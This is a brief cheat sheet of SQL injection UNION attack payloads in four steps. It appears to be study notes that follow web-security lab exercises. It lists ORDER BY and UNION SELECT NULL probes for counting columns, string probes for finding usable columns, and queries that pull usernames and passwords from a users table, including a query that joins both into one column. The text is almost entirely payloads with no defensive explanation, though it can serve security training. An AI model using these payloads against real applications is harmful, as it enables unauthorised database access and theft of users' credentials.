# 1 Determining the number of columns required in an SQL injection UNION attack

' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 
etc.


' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL-- 
etc.

# 2 Finding columns with a useful data type in an SQL injection UNION attack

' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--

# 3 Using an SQL injection UNION attack to retrieve interesting data

' UNION SELECT username, password FROM users--

# 4 Retrieving multiple values within a single column

' UNION SELECT username || '~' || password FROM users--